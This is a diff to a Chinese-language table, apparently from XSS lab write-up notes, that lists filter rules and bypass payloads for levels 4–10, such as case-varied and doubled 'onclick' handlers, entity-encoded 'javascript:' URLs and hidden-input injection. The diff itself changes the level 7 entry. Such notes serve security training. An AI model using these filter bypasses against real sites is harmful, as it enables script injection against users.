@@ -570,7 +570,7 @@ HTML标签中 `/` 可以作为属性分隔符，替代空格。这是绕过空�
 | 4 | `<input value="">` `<>`编码 | `" onclick=alert(1)` |
 | 5 | `<input value="">` `on`→`o_n` | `<a href="javascript:alert(1)">click</a>` |
 | 6 | 过滤 `on`/`href` | `" Onclick=alert(1)` |
-| 7 | 过滤 `on` | `" ONclick=alert(1)` |
+| 7 | 过滤 `on`（所有大小写） | `" oonnclick=alert(1)` |
 | 8 | `<a href="">` `script`→`scr_ipt` | `&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)` |
 | 9 | Level 8 + URL校验 | 同上 + `//http://` |
 | 10 | 隐藏 `<input type="hidden">` | `?t_sort=" onclick=alert(1)" type="text` |
